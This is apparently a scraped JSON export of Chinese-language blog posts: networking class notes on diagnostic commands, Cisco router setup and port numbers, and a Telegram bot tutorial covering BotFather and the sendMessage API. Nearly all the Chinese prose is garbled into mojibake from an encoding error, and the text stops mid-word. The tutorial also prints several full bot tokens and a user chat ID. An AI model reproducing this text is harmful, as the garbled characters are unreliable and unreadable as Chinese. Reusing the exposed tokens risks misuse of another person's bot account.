ä¹Ÿå¯è¼¸å…¥ç¶²å€ tracert www.pchome.com.tw nslookup åˆ¤æ–·DNSåç¨±è§£æä¼ºæœå™¨æ˜¯å¦æ­£å¸¸ 1 2 3 4 nslookup 168.95.1.1 ### ä¹Ÿå¯è¼¸å…¥ç¶²å€ nslookup www.pchome.com.tw netstat æŸ¥è©¢é›»è…¦é€£ç·šæœå‹™çš„ç‹€æ…‹ ä½¿ç”¨portï¼š7 1 2 3 4 netstat ### åˆ—å‡ºç›®å‰æ‰€æœ‰çš„ç¶²è·¯ç‹€æ…‹(åŒ…å«IPv6) netstat -an Cisco Packet Tracer è¨­å®šRouter ç¯„ä¾‹ä½¿ç”¨çš„è¨­å‚™\nRouters: 1841 router Connections: RS 232 Devices: PC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ### é€²å…¥router Router\u0026gt; enable Router# ### é€²å…¥privey config Router# configure terminal Router(config)# ### è¨­å®š hostname (ç¯„ä¾‹è¨­å®šç‚º\u0026#34;ISP_1\u0026#34;) Router(config)# hostname ISP_1 ### è¨­å®šç¶²å¡ä»‹é¢ (ç¯„ä¾‹è¨­å®šç‚º\u0026#34;fastEthernet 0/0\u0026#34;) ISP_1(config)# interface fastEthernet 0/0 ISP_1(config-if)# ### è¨­å®šIP ISP_1(config-if)# ip address 192.168.0.5 255.255.255.0 ISP_1(config-if)# ### é›¢é–‹ä¸¦æŸ¥çœ‹IPè¨­å®š ISP_1(config-if)# exit ISP_1(config)# exit ISP_1# ISP_1# show running-config Building configuration... Current configuration : 575 bytes ! version 12.4 no service timestamps log datetime msec no service timestamps debug datetime msec no service password-encryption ! hostname ISP_1 ! ! ! ! ! ! ! ! ip cef no ipv6 cef ! ! --More-- Wireshark é˜²ç«ç‰†æ¦‚å¿µ FTP ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š21(å‘½ä»¤å‚³è¼¸)ã€20(æª”æ¡ˆå‚³è¼¸) è¿‘æœŸå·²è¼ƒä¸å¸¸ä½¿ç”¨ï¼Œå› å®‰å…¨æ€§å•é¡Œ SSH(secure shell) ä½¿ç”¨TCPé€šè¨Šå”å®š ç”¨æ–¼ç™»å…¥ç³»çµ±ã€å‚³è¼¸æŒ‡ä»¤ åŠ å¯†å‚³è¼¸ ä½¿ç”¨portï¼š22 telnet ä½¿ç”¨TCPé€šè¨Šå”å®š ç”¨æ–¼æ–‡å­—å‘½ä»¤ ç„¡åŠ å¯† ä½¿ç”¨portï¼š23 SMTP(simple mail transfer protocal) ä½¿ç”¨DNS Serverçš„MX Record ç”¨æ–¼å¯„å‡ºmail ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š25 å°å¯„ä»¶è€…èº«åˆ†ä¸åšé©—è­‰ï¼Œåªæœƒé©—è­‰æ”¶ä»¶è€… ç¾ä»Šå·²è¼ƒå°‘ä½¿ç”¨ï¼Œé€šå¸¸å·²æ”¹ä½¿ç”¨ç¶²é å¼çš„mailï¼Œè¼ƒæ–¼å®‰å…¨ä¸”æ¸›çœè³‡æº POP3 ç”¨ä¾†æ¥æ”¶mailã€é ç«¯ç®¡ç†éƒµä»¶ï¼Œå¯ä»¥å–®ç´”ä¸‹è¼‰ï¼Œä¼ºæœå™¨ç«¯ä¸éœ€åˆªé™¤ æ¡ç”¨ä¸åŠ å¯†é€šè¨Š æ–°ç‰ˆ(POP3S)æ¡å–åŠ å¯†é€šè¨Š ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š110 WHOIS ç”¨æ–¼æŸ¥è©¢ç¶²éš›ç¶²è·¯ä¸­ç¶²åŸŸåç¨±IPèˆ‡æ‰€æœ‰è€…çš„è³‡è¨Š ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š43 DNS(domain name system) ç”¨æ–¼ç¶²åŸŸåç¨±èˆ‡IPçš„å°æ‡‰æŸ¥è©¢ åŒæ™‚ä½¿ç”¨TCP/UDPé€šè¨Šå”å®š ä½¿ç”¨portï¼š53 HTTP(hypertext transfer protocol) ç¶²é çš„ç™¼å¸ƒå’Œæ¥æ”¶ ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š80 (8080ç‚ºæ›¿ä»£port) IMAP ç”¨æ–¼ç·šä¸Šå’Œé›¢ç·šç‹€æ…‹çš„ç€è¦½æ¨¡å¼ ä½¿ç”¨TCPé€šè¨Šå”å®š ä½¿ç”¨portï¼š143 (8080ç‚ºæ›¿ä»£port) ","date":"2022-09-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52351384271_09abac0c54_o.jpg","permalink":"https://wayneblog.ga/2022-09-12/network-management-lesson/","title":"ç¶²è·¯ç®¡ç†æŠ€è¡“æ‡‰ç”¨å¯¦å‹™ç­ç­†è¨˜"},{"content":" åƒè€ƒç¶²ç«™ - Telegram èŠå¤©æ©Ÿå™¨äººåŸç†\nåƒè€ƒç¶²ç«™ - å‘ @BotFather ç”³è«‹ä¸€éš»æ©Ÿå™¨äººå§ï¼\nåƒè€ƒç¶²ç«™ - Telegram æ©Ÿå™¨äººçš„è¨­å®š\nåƒè€ƒç¶²ç«™ - CI/CD trigger WebHook to Telegram Bot\nåƒè€ƒç¶²ç«™ - How to setup a Telegram bot for your Drone CI/CD builds\nTelegram èŠå¤©æ©Ÿå™¨äººåŸç† æ©Ÿå™¨äººçš„é‹ä½œåŸç† ç¾åœ¨ä½ ç™¼äº†ä¸€æ®µè¨Šæ¯çµ¦æ©Ÿå™¨äºº\nä½†æ˜¯ä¸¦ä¸æ˜¯æ©Ÿå™¨äººç›´æ¥å›ä½ è¨Šæ¯\nè©³ç´°æƒ…æ³å¦‚ä¸‹åœ–ï¼š\nä¸€é–‹å§‹ä½ çš„è¨Šæ¯æœƒè¢«å‚³é€åˆ° TG ä¼ºæœå™¨ TG ä¼ºæœå™¨æœƒé€šçŸ¥æ©Ÿå™¨äººï¼šæ¬¸ï¼æœ‰ä¸€å‰‡æ–°è¨Šæ¯ æ©Ÿå™¨äººæœƒç™¼ä¸€å€‹æŒ‡ä»¤çµ¦ TG ä¼ºæœå™¨ TG ä¼ºæœå™¨ç…§è‘—æŒ‡ä»¤çš„éœ€æ±‚ï¼Œå›æ‡‰è¨Šæ¯çµ¦ä½  æ©Ÿå™¨äººæ¥æ”¶è¨Šæ¯çš„å…©ç¨®æ¨¡å¼ æ©Ÿå™¨äººå¯ä»¥æ”¾åœ¨ä¼ºæœå™¨ï¼Œä¹Ÿå¯ä»¥ç”¨å®¢æˆ¶ç«¯çš„æ–¹å¼é‹ä½œ\nWebhook\nä»¥ ä¼ºæœå™¨ æ–¹å¼è¢«å‹•æ¥æ”¶è¨Šæ¯ï¼Œéœ€è¦æœ‰ IP ä½ç½®ï¼Œé€šå¸¸æœƒæ”¾åœ¨ ç¶²ç«™ä¼ºæœå™¨(Web Hosting) ä¸Šï¼Œè¦è‡ªå·±æ¶è¨­ç¶²ç«™ä¼ºæœå™¨ä¸æ˜¯ä»¶å®¹æ˜“çš„äº‹ï¼Œæ‰€ä»¥å®˜æ–¹é‚„æä¾›äº†å¦ä¸€ç¨®åšæ³• Long Pollingã€‚\nä»¥ å®¢æˆ¶ç«¯ æ–¹å¼ä¸»å‹•è·Ÿ TG ä¼ºæœå™¨è¦è¨Šæ¯ï¼Œå¯ä»¥ç›´æ¥ åœ¨è‡ªå·±é›»è…¦ä¸Šé‹ä½œï¼Œä¸éœ€è¦æ¶(ç§Ÿ)ä¼ºæœå™¨ä¹Ÿèƒ½è®“æ©Ÿå™¨äººé †åˆ©é‹ä½œï¼Œç¼ºé»å°±æ˜¯é›»è…¦è¦ä¸€ç›´é–‹è‘—ï¼Œç•¶ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ é›²ç«¯æœå‹™(IaaSã€PaaSã€SaaS)ã€‚ æ©Ÿå™¨äººç™¼é€è¨Šæ¯çš„ä¸‰ç¨®æ–¹å¼ HTTP GET 1 https://api.telegram.org/bot{Token}/{Method}?{Parameter1}={Value1}\u0026amp;{Parameter2}={Value2} ç›´æ¥ä»¥ ç¶²å€åƒæ•¸ çš„æ–¹å¼å‚³é€æŒ‡ä»¤ï¼ŒGET æ²’æœ‰ Bodyï¼Œåªå‚³é€ Headers (ä½ å¯ä»¥ç•¶ä½œä¸æœƒå‚³é€æª”æ¡ˆéå»)ï¼Œé€šå¸¸æ˜¯ç”¨ä¾†å–è³‡æ–™ç”¨ï¼Œå„ªé»æ˜¯å¯ä»¥ç›´æ¥ç”¨ç€è¦½å™¨åŸ·è¡Œï¼Œç¼ºé»æ˜¯æœ‰ 2KB çš„é™åˆ¶ï¼Œé›–ç„¶ä¸å¤ªå¯èƒ½ç”¨åˆ°é€™é•·çš„æŒ‡ä»¤ï¼Œä½†é‚„æ˜¯æ¯”è¼ƒå»ºè­°ä½¿ç”¨ POSTã€‚\nHTTP POST 1 {\u0026#34;method\u0026#34;:\u0026#34;Method\u0026#34;,\u0026#34;Parameter1\u0026#34;:\u0026#34;Value1\u0026#34;,\u0026#34;Parameter2\u0026#34;:\u0026#34;Value2\u0026#34;} POST æ˜¯ ä»¥ Body å‚³é€è³‡æ–™(æª”æ¡ˆ)ï¼Œç¨‹å¼é€šå¸¸éƒ½æ˜¯ä»¥é€™ç¨®æ–¹å¼æºé€šï¼Œç¶²é è£¡çš„è¡¨å–®ä¹Ÿç¶“å¸¸æ˜¯ä»¥é€™ç¨®æ–¹å¼å‚³é€ï¼Œè³‡æ–™ä¸æœƒé¡¯ç¤ºåœ¨ç¶²å€åˆ—ï¼Œå¯ä»¥å‚³é€çš„è³‡æ–™å¤§å°æ¯” GET å¤§å¾—å¤šï¼š1MB ~ 2GBã€‚\nç›´æ¥ Print é€™å€‹æ–¹å¼ åªæœ‰åœ¨ webhook æ¨¡å¼ ä¸‹æ‰èƒ½ä½¿ç”¨ï¼Œå› ç‚ºåªæœ‰ä¼ºæœå™¨å¯ä»¥ç›´æ¥å›æ‡‰è¨Šæ¯ã€‚\nå‘ @BotFather ç”³è«‹ä¸€éš»æ©Ÿå™¨äººå§ï¼ The BotFather The Botfather é€™å€‹åå­—æ˜¯è‡´æ•¬ 1972 å¹´çš„ç¾åœ‹é›»å½±ã€Šæ•™çˆ¶ã€‹\nå®ƒæ˜¯æ©Ÿå™¨äººï¼Œä¹Ÿæ˜¯æ©Ÿå™¨äººçš„ç®¡ç†è€…\nå¹¾ä¹æ‰€æœ‰æ©Ÿå™¨äººçš„è¨­å®šã€å»ºç«‹éƒ½è¦é€éä»–\nç”¨æ©Ÿå™¨äººè¨­å®šæ©Ÿå™¨äººè½èµ·ä¾†å°±å¾ˆæœ‰è¶£ï¼Œå°å§ï¼Ÿ\n@BotFather çš„åŠŸèƒ½ ç§è¨Š @BotFather ï¼ŒæŒ‰ã€Œé–‹å§‹ã€å¾Œå°±æœƒé¡¯ç¤ºå‡ºä¸€å¤§å †æŒ‡ä»¤ï¼ŒçœŸæ˜¯ä»¤äººçœ¼èŠ±æ’©äº‚\nå®˜æ–¹ç¶²é ç‰ˆèªªæ˜\nç°¡å–®ä»‹ç´¹å¹¾å€‹æ¯”è¼ƒå¸¸ç”¨çš„åŠŸèƒ½ï¼š\næŒ‡ä»¤ èªªæ˜ /newbot å»ºç«‹ä¸€å€‹æ–°çš„æ©Ÿå™¨äºº /mybots åˆ—å‡ºæ‰€æœ‰æ©Ÿå™¨äººï¼Œç”¨æŒ‰éˆ•çš„æ–¹å¼è¨­å®šæ©Ÿå™¨äººï¼Œè€ŒéæŒ‡ä»¤ï¼ˆé€™æ¨£å¯ä»¥è®“èŠå¤©ç´€éŒ„è®Šå¾—å¾ˆä¹¾æ·¨ï¼Œæˆ‘æ¯”è¼ƒå–œæ­¡ç”¨é€™å€‹ï¼‰ ä¿®æ”¹ç›¸é—œ /setname ä¿®æ”¹é¡¯ç¤ºåç¨± /setdescription ä¿®æ”¹èªªæ˜ /setabouttext ä¿®æ”¹ç°¡ä»‹ /setuserpic ä¿®æ”¹å¤§é ­è²¼ /setcommands ä¿®æ”¹æŒ‡ä»¤é¸å–® /deletebot åˆªé™¤æ©Ÿå™¨äºº è¨­å®šç›¸é—œ /token é¡¯ç¤ºæ©Ÿå™¨äººçš„ token /revoke ç”¢ç”Ÿæ–°çš„ tokenï¼ŒèˆŠçš„æœƒå¤±æ•ˆ /setjoingroups è¨­å®šæ˜¯å¦èƒ½è¢«åŠ å…¥ç¾¤çµ„ /setprivacy è¨­å®šæ˜¯å¦èƒ½è®€å–æ‰€æœ‰èŠå¤©å®¤è¨Šæ¯ï¼ˆæ©Ÿå™¨äººçš„è¨Šæ¯é™¤å¤–ï¼Œæ©Ÿå™¨äººä¸è«–å¦‚ä½•éƒ½ä¸æœƒçœ‹åˆ°æ©Ÿå™¨äººçš„è¨Šæ¯ï¼‰ å»ºç«‹ä½ çš„æ©Ÿå™¨äººå§ è¼¸å…¥ /newbot æŒ‡ä»¤ å¹«æ©Ÿå™¨äººå–åå­— 1 Alright, a new bot. How are we going to call it? Please choose a name for your bot. é€™é‚Šå®ƒæœƒè¦ä½ å¹«ä½ çš„æ©Ÿå™¨äººå–ä¸€å€‹åå­—ï¼Œé€™å€‹ä»¥å¾Œèƒ½ä¿®æ”¹ï¼Œæ‰€ä»¥éš¨ä¾¿å–æ²’å·®\nè¨­å®š username 1 Good. Now let\u0026#39;s choose a username for your bot. It must end in `bot`. Like this, for example: TetrisBot or tetris_bot. âš ï¸ æ³¨æ„ï¼šè¨­å®šå¾Œå°±ä¸èƒ½ä¿®æ”¹äº†ï¼Œè«‹è¬¹æ…æ€è€ƒä¹‹å¾Œè¨­å®šï¼Œé¿å…åæ‚”æ™‚éœ€è¦è«‹ä½¿ç”¨è€…é·ç§»\néœ€è¦å¹«ä½ çš„æ©Ÿå™¨äººè¨­å®šä¸€å€‹ usernameï¼Œå¿…é ˆç¬¦åˆä»¥ä¸‹è¦å‰‡ï¼š\nä¸éœ€è¦æ‰“ @ ä»¥ a~z é–‹é ­ ä»¥ bot çµå°¾ åªèƒ½ä½¿ç”¨ a~zã€0~9 å’Œåº•ç·š æœ€å°é•·åº¦ç‚º 5 å€‹å­—å…ƒ é¡¯ç¤ºæ™‚æœƒå€åˆ†å¤§å°å¯«ï¼Œä½¿ç”¨æ™‚ä¸å€åˆ†å¤§å°å¯«ï¼ˆä¾‹å¦‚è¨­å®šæˆ @TetrisBotï¼Œç”¨ @tETrISbOt ä¸€æ¨£æœƒæŒ‡åˆ°åŒä¸€å€‹æ©Ÿå™¨äººï¼‰\nå¸¸è¦‹å•é¡Œï¼š\nä¸èƒ½ä»¥æ•¸å­—é–‹é ­ 1 Sorry, this username is invalid. ä¸èƒ½ç”¨ bot ä»¥å¤–çš„å­—çµå°¾ 1 Sorry, the username must end in \u0026#39;bot\u0026#39;. E.g. \u0026#39;Tetris_bot\u0026#39; or \u0026#39;Tetrisbot\u0026#39; username å·²ç¶“è¢«åˆ¥äººå…ˆç”¨èµ°äº† 1 Sorry, this username is already taken. Please try something different. å‡ºç¾ Done è¡¨ç¤ºä½ è¨­å®šæˆåŠŸäº†\nä½¿ç”¨ä½ çš„æ©Ÿå™¨äººå§ ç¾åœ¨ä½ å·²ç¶“å¯ä»¥ä½¿ç”¨æ©Ÿå™¨äººäº†\næŒ‰ä¸‹èªªæ˜è£¡çš„é€£çµ(t.me/ironman2021_by_miku3920_bot é»ä½ è‡ªå·±çš„)ï¼Œä¸¦ä¸”é»æ“Šã€Œé–‹å§‹ã€\nç„¶å¾Œä½ å°±æœƒç™¼ç¾ä»€éº¼äº‹æƒ…éƒ½æ²’ç™¼ç”Ÿï¼Œå› ç‚ºæˆ‘å€‘é‚„æ²’å¯«æ©Ÿå™¨äººçš„ç¨‹å¼å˜›\nä¸éå°±ç®—ä¸å¯«ç¨‹å¼ä¹Ÿå¯ä»¥è®“å®ƒèªªè©±ï¼Œåˆ©ç”¨ HTTP GET æ–¹æ³•ï¼Œèˆ‡ sendMessage é€™å€‹ API\n1 https://api.telegram.org/bot{Token}/{Method}?{Parameter1}={Value1}\u0026amp;{Parameter2}={Value2} Tokenï¼š1985044907:AAEdySrbzTc8tVdBjfymlfyaBUJGeu7r-v4ï¼ˆä½ çš„ bot tokenï¼‰ Methodï¼šsendMessage Parameter1ï¼šchat_id Value1ï¼š127355800ï¼ˆä½ çš„ uidï¼Œå¯ä»¥é€é @userinfobot å–å¾—ï¼‰ Parameter2ï¼štext Value2ï¼šHello,+World!+ä½ å¥½ï¼Œä¸–ç•Œï¼ï¼ˆç©ºç™½è¦ç”¨ã€Œ+ã€æ›¿æ›ï¼‰ çµ„åˆå®Œæœƒåƒé€™å€‹æ¨£å­ï¼Œç›´æ¥è²¼åˆ°ç€è¦½å™¨çš„ç¶²å€åˆ—å°±èƒ½ä½¿ç”¨å›‰ï¼š\n1 https://api.telegram.org/bot1985044907:AAEdySrbzTc8tVdBjfymlfyaBUJGeu7r-v4/sendMessage?chat_id=127355800\u0026amp;text=Hello,+World!+ä½ å¥½ï¼Œä¸–ç•Œï¼ PSï¼šèŠå¤©å®¤çš„ chat_idï¼Œå…ˆå°‡ä½ çš„æ©Ÿå™¨äººé‚€è«‹é€²å…¥èŠå¤©å®¤ï¼Œå†ä½¿ç”¨æ­¤ç¶²å€å–å¾—ï¼šhttps://api.telegram.org/bot${your_bot_token}/getUpdates\nå¸¸è¦‹å•é¡Œï¼š\nToken æ‰“éŒ¯ 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:401,\u0026#34;description\u0026#34;:\u0026#34;Unauthorized\u0026#34;} Method æ‰“éŒ¯ 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:404,\u0026#34;description\u0026#34;:\u0026#34;Not Found\u0026#34;} chat_id çš„å€¼ä¸èƒ½ç‚ºç©º 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: chat_id is empty\u0026#34;} chat_id çš„å€¼æ‰“éŒ¯ 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: chat not found\u0026#34;} æ²’ç§è¨Šéæ©Ÿå™¨äºº 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:403,\u0026#34;description\u0026#34;:\u0026#34;Forbidden: bot can\u0026#39;t initiate conversation with a user\u0026#34;} text çš„å€¼ä¸èƒ½ç‚ºç©º 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: message text is empty\u0026#34;} æˆåŠŸçš„è©±æœƒè¿”å›æ©Ÿå™¨äººç™¼é€çš„è¨Šæ¯ï¼ˆjson æ ¼å¼ï¼‰åˆ°ç¶²é ä¸Šï¼š\n1 {\u0026#34;ok\u0026#34;:true,\u0026#34;result\u0026#34;:{\u0026#34;message_id\u0026#34;:5,\u0026#34;from\u0026#34;:{\u0026#34;id\u0026#34;:1985044907,\u0026#34;is_bot\u0026#34;:true,\u0026#34;first_name\u0026#34;:\u0026#34;2021 iThome\\u9435\\u4eba\\u8cfd\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;ironman2021_by_miku3920_bot\u0026#34;},\u0026#34;chat\u0026#34;:{\u0026#34;id\u0026#34;:127355800,\u0026#34;first_name\u0026#34;:\u0026#34;\\u521d\\u97f3\u0026#34;,\u0026#34;last_name\u0026#34;:\u0026#34;\\u30df\\u30af\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;miku3920\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;private\u0026#34;},\u0026#34;date\u0026#34;:1631440402,\u0026#34;text\u0026#34;:\u0026#34;Hello, World! \\u4f60\\u597d\\uff0c\\u4e16\\u754c\\uff01\u0026#34;}} Telegram æ©Ÿå™¨äººçš„è¨­å®š è¼¸å…¥ /mybots æŒ‡ä»¤å¾Œå°±æœƒå‡ºç¾æ©Ÿå™¨äººåˆ—è¡¨\n1 Choose a bot from the list below: é¸æ“‡ä¸€å€‹ä½ è¦æŸ¥çœ‹æˆ–è¨­å®šçš„æ©Ÿå™¨äºº\næˆ‘ä¹‹å‰å°±æœ‰å»ºç«‹éæ©Ÿå™¨äººï¼Œæ‰€ä»¥æœƒé¡¯ç¤ºå…©å€‹\n1 2 Here it is: 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. What do you want to do with the bot? é»ä¸‹å»å¾Œå°±æœƒå‡ºç¾å…­å€‹é¸é …ï¼Œæˆ‘ä¸€å€‹å€‹ä¾†è¬›è§£ï¼š\nAPI Token - æŸ¥çœ‹ token 1 2 3 Here is the token for bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot: 1985044907:AAH1kZaEZFHoA6YqB6IFtvbkyOjvcpPOfbQ å¿˜è¨˜ token æ™‚å¯ä»¥ä¾†é€™è£¡æŸ¥çœ‹ï¼Œæˆ–æ˜¯ä½ æƒ³è¦é‡ç½® token\nRevoke current token - é‡ç½® token 1 2 3 Token for the bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot has been revoked. New token is: 1985044907:AAG3E05XowN2sqy286aplwr6oBc17q0CByg æŒ‰ä¸‹é‡ç½®æŒ‰éˆ•å¾Œï¼Œå®ƒå°±æœƒçµ¦ä½ ä¸€å€‹æ–°çš„ tokenï¼ŒèˆŠçš„æœƒç«‹å³å¤±æ•ˆ\nEdit Bot - ä¿®æ”¹æ©Ÿå™¨äºº 1 2 3 4 5 6 7 Edit @ironman2021_by_miku3920_bot info. Name: 2021 iThomeéµäººè³½ Description: ? About: ? Botpic: ? no botpic Commands: no commands yet Edit Name - ä¿®æ”¹åå­— æŒ‰ä¸‹æŒ‰éˆ•å¾Œæœƒå‡ºç¾ä»¥ä¸‹è¨Šæ¯\n1 OK. Send me the new name for your bot. ç›´æ¥å‚³é€æ–°çš„åç¨±çµ¦å®ƒå°±è¡Œäº†\n1 Success! Name updated. /help çœ‹åˆ°é€™å€‹å°±æ˜¯ä¿®æ”¹æˆåŠŸäº†\nEdit Description - ä¿®æ”¹èªªæ˜ é€™å€‹æœƒé¡¯ç¤ºåœ¨èŠå¤©å®¤çš„æœ€ä¸Šæ–¹ï¼Œç”¨ä¾†èªªæ˜æ©Ÿå™¨äººæœ‰èƒ½äº›åŠŸèƒ½ï¼Œæˆ–æ˜¯å¦‚ä½•ä½¿ç”¨\n1 OK. Send me the new description for the bot. People will see this description when they open a chat with your bot, in a block titled \u0026#39;What can this bot do?\u0026#39;. å‚³é€ä¸€æ®µè¨Šæ¯çµ¦å®ƒï¼Œå¯ä»¥æ˜¯å¤šè¡Œçš„æ–‡å­—\n1 Success! Description updated. /help çœ‹åˆ°é€™å€‹å°±æ˜¯ä¿®æ”¹æˆåŠŸäº†\nåŸæœ¬åœ¨èŠå¤©å®¤ä¸Šæ–¹å•¥éƒ½æ²’æœ‰ï¼Œç¾åœ¨å¤šäº†ä¸€å€‹è¨Šæ¯æ¡†\nEdit About - ä¿®æ”¹ç°¡ä»‹ é€™å€‹æœƒé¡¯ç¤ºåœ¨æ©Ÿå™¨äººçš„å€‹äººè³‡è¨Šé é¢ä¸Š\n1 OK. Send me the new \u0026#39;About\u0026#39; text. People will see this text on the bot\u0026#39;s profile page and it will be sent together with a link to your bot when they share it with someone. å‚³é€ä¸€æ®µè¨Šæ¯çµ¦å®ƒï¼Œå¯ä»¥æ˜¯å¤šè¡Œçš„æ–‡å­—\n1 Success! About section updated. /help çœ‹åˆ°é€™å€‹å°±æ˜¯ä¿®æ”¹æˆåŠŸäº†\nåŸæœ¬æ˜¯åªæœ‰é¡¯ç¤º usernameï¼Œç¾åœ¨å¤šäº† ç°¡ä»‹\nEdit Botpic - ä¿®æ”¹å¤§é ­è²¼ 1 OK. Send me the new profile photo for the bot. å»ºè­°å…ˆè£åˆ‡æˆæ­£æ–¹å½¢ï¼ˆ1ï¼š1ï¼‰\n1 Please send me the picture as a \u0026#39;Photo\u0026#39;, not as a \u0026#39;File\u0026#39;. é€™é‚Šè¦å‚³é€ç…§ç‰‡ï¼Œä¸èƒ½å‚³æª”æ¡ˆ\n1 Success! Profile photo updated. /help æˆåŠŸçš„è©±ï¼Œæ©Ÿå™¨äººçš„å¤§é ­è²¼å°±æœƒæ›´æ–°æˆå‰›å‰›ä¸Šå‚³çš„åœ–ç‰‡\nEdit Commands - ä¿®æ”¹æŒ‡ä»¤é¸å–® 1 2 3 4 5 6 OK. Send me a list of commands for your bot. Please use this format: command1 - Description command2 - Another description Send /empty to keep the list empty. è¦æŒ‰ç…§å®ƒçµ¦çš„æ ¼å¼è¼¸å…¥ï¼Œä¸éœ€è¦æ‰“ /\n1 Success! Command list updated. /help æˆåŠŸçš„è©±ï¼Œé¸å–®ä¸­å°±æœƒå‡ºç¾å‰›å‰›è¨­å®šçš„æŒ‡ä»¤\nå¦‚æœæ©Ÿå™¨äººæ˜¯åœ¨ç¾¤çµ„ä½¿ç”¨ï¼Œå»ºè­°æ”¹æˆç©ºçš„ï¼Œé¿å…èª¤è§¸\nç¾¤çµ„è£¡è¼ƒå¸¸ä½¿ç”¨ ! é–‹é ­çš„æŒ‡ä»¤ï¼Œé€™æ¨£æ‰ä¸æœƒè®Šæˆè—è—çš„å®¹æ˜“æŒ‰åˆ°\nåœ¨å‰›å‰›é‚£é‚Šï¼ŒæŒ‰ /empty å°±è¡Œäº†\nä¿®æ”¹å®Œæœƒè®Šæˆé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 Edit @ironman2021_by_miku3920_bot info. Name: 2021 iThomeéµäººè³½ Description: ä¸€äº›èªªæ˜æ–‡å­—ï¼ŒåŠŸèƒ½å¦‚ä¸‹ï¼š 1. AAA 2. BBB 3. CCC About: éµäººè³½å±•ç¤ºç”¨æ©Ÿå™¨äºº by @miku3920 éµäººè³½å±•ç¤ºç”¨æ©Ÿå™¨äºº by @miku3920 éµäººè³½å±•ç¤ºç”¨æ©Ÿå™¨äºº by @miku3920 Botpic: ? has a botpic Commands: no commands yet Bot Settings - è¨­å®šæ©Ÿå™¨äºº 1 Settings for @ironman2021_by_miku3920_bot. Inline Mode - å…§è¯æ¨¡å¼ï¼ˆå…§åµŒæ¨¡å¼ï¼‰ å¯ä»¥è®“æ©Ÿå™¨äººç›´æ¥åœ¨è¨Šæ¯è¼¸å…¥æ¡†ä½¿ç”¨ï¼Œä¸éœ€è¦å°‡æ©Ÿå™¨äººåŠ å…¥ç¾¤çµ„\né€™å€‹åŠŸèƒ½å¤ è¬›ä¸€æ•´å¤©äº†ï¼Œç›®å‰é‚„ç”¨ä¸åˆ°ï¼Œæˆ‘å€‘ä»¥å¾Œå°ˆé–€æ‰¾ä¸€å¤©ä¾†è¬›\nAllow Group? - æ˜¯å¦èƒ½è¢«åŠ å…¥ç¾¤çµ„? 1 2 3 Groups are currently enabled for bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot Disabling groups will forbid users to add 2021 iThomeéµäººè³½ to groups. enabled(é è¨­) - è¡¨ç¤ºæ©Ÿå™¨äººèƒ½è¢«åˆ¥äººæ‹‰é€²ç¾¤çµ„\nå¦‚æœä½ ä¸æƒ³è®“åˆ¥äººæ‹‰ä½ çš„æ©Ÿå™¨äººï¼Œå¯ä»¥æŒ‰ Turn groups off\n1 2 3 Groups are currently disabled for bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. Enabling groups will allow users to add 2021 iThomeéµäººè³½ to groups. disabled - è¡¨ç¤ºæ©Ÿå™¨äººä¸èƒ½è¢«åˆ¥äººæ‹‰é€²ç¾¤çµ„\nå¦‚æœä½ æƒ³è®“åˆ¥äººçš„ç¾¤çµ„ä¹Ÿèƒ½ä½¿ç”¨ä½ çš„æ©Ÿå™¨äººï¼Œå°±æŒ‰ Turn groups on\nGroup Privacy - æ˜¯å¦èƒ½è®€å–æ‰€æœ‰èŠå¤©å®¤è¨Šæ¯ å®˜æ–¹èªªæ˜\n1 Privacy mode is enabled for 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. enabled(é è¨­) - è¡¨ç¤ºæ©Ÿå™¨äººæ˜¯æˆå“¡æ™‚ä¸èƒ½è®€å–ç¾¤çµ„è£¡çš„æ‰€æœ‰è¨Šæ¯\næ©Ÿå™¨äººåªçœ‹çš„åˆ°å®ƒçš„æŒ‡ä»¤å’Œå›è¦†å®ƒçš„è¨Šæ¯\nä½†æ˜¯å¦‚æœå‡ç´šæˆç®¡ç†å“¡å°±æ²’é€™é™åˆ¶\n1 Privacy mode is disabled for 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. disabled - è¡¨ç¤ºæ©Ÿå™¨äººå°±ç®—ä¸æ˜¯ç®¡ç†å“¡ä¹Ÿèƒ½è®€å–ç¾¤çµ„è£¡çš„æ‰€æœ‰è¨Šæ¯\næ©Ÿå™¨äººæ˜¯æˆå“¡æ™‚å°±èƒ½è®€å–æ‰€æœ‰è¨Šæ¯\nPayments - ä»˜æ¬¾ç›¸é—œè¨­å®š å°ç£ä¸èƒ½ç”¨ï¼Œæœ‰ç”Ÿä¹‹å¹´ç³»åˆ—ï¼Œè·³é\nDomain - ç¶²ç«™ç™»å…¥ç”¨ èˆ‡æ©Ÿå™¨äººè¼ƒç„¡é—œï¼Œæš«æ™‚ä¸æ\nPayments - ä»˜æ¬¾ç›¸é—œè¨­å®š æ­ä»˜å¯¶ã€ç¶ 